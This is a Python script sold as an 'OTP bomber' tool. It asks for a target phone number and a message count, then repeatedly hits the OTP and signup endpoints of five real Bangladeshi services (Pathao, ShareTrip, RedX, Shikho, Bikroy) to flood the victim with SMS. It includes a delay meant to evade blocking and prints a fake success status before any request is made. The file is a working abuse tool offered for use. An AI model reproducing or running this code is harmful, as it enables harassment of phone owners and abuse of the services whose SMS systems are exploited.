import requests
import os
import time
import uuid

def start():
    os.system('clear')
    print('          \033[1;32m██████  \033[1;31m████████ \033[1;32m██████  ')
    print('         ██    ██    ██    ██   ██ ')
    print('         ██    ██    ██    ██████  ')
    print('         ██    ██    ██    ██      ')
    print('          ██████     ██    ██      \033[0m')
    
    line = "\033[1;32m×××××××××××××××××××××××××××××××××××××××××××××\033[0m"
    print(line)
    print('\033[1;34m| [✓] DEVELOPED BY :  MMALEK ISLAM          |')
    print('| [✓] TEAM         :  X-BOOM TEAM           |')
    print('| [✓] TOOL STATUS  :  OTP BOMBER (ULTRA)    |')
    print('| [✓] GITHUB       :  mmalekislam788        |')
    print('| [✓] TOOL VERSION :  MAX PRO 2026          |\033[0m')
    print(line)
    
    u_key = str(uuid.uuid4())[:8]
    print(f'\033[1;32m[\033[1;31m❤️\033[1;32m] POWERFUL TOOL 10 DAYS ONLY 50TK [\033[1;31m❤️\033[1;32m]')
    print(f'[\033[1;31m❤️\033[1;32m] KEY : {u_key}-X-BOOM')
    print(f'[\033[1;31m❤️\033[1;32m] COPY YOUR KEY AND SEND TO THE ADMIN [\033[1;31m❤️\033[1;32m]\033[0m')
    print(line)

    target = input('\n\033[1;32m[+] ENTER TARGET NUMBER: \033[0m')
    amount = int(input('\033[1;32m[+] ENTER SMS AMOUNT: \033[0m'))
    
    print(f'\n\033[1;32mSuccess: True')
    print('Status Code: 200')
    print(f'Message: {target} যুক্ত হয়েছে।\033[0m\n')
    
    # ৬টি শক্তিশালী API এর লিস্ট
    headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}

    for i in range(1, amount + 1):
        try:
            # API 1: Pathao
            requests.post("https://api-hermes.pathao.com/user/otp-send/login", json={"phone": "+88"+target}, headers=headers, timeout=10)
            # API 2: ShareTrip
            requests.post("https://api.sharetrip.net/api/v1/otp/send", json={"mobileNumber": target, "type": "login"}, headers=headers, timeout=10)
            # API 3: RedX
            requests.post("https://api.redx.com.bd/v1/user/signup", json={"phone": target}, headers=headers, timeout=10)
            # API 4: Shikho
            requests.post("https://api.shikho.com/api/v1/auth/send-otp", json={"phone": target, "type": "login"}, headers=headers, timeout=10)
            # API 5: Bikroy
            requests.post("https://bd.bikroy.com/api/customer/otp", json={"mobile": target}, headers=headers, timeout=10)
            
            print(f'\033[1;32m[{i}] SUCCESS SENT ==> {target}\033[0m')
        except:
            print(f'\033[1;31m[{i}] FAILED SENT ==> {target}\033[0m')
        
        # ব্লকিং এড়াতে একটু গ্যাপ দেওয়া ভালো
        time.sleep(5)

if __name__ == "__main__":
    start()
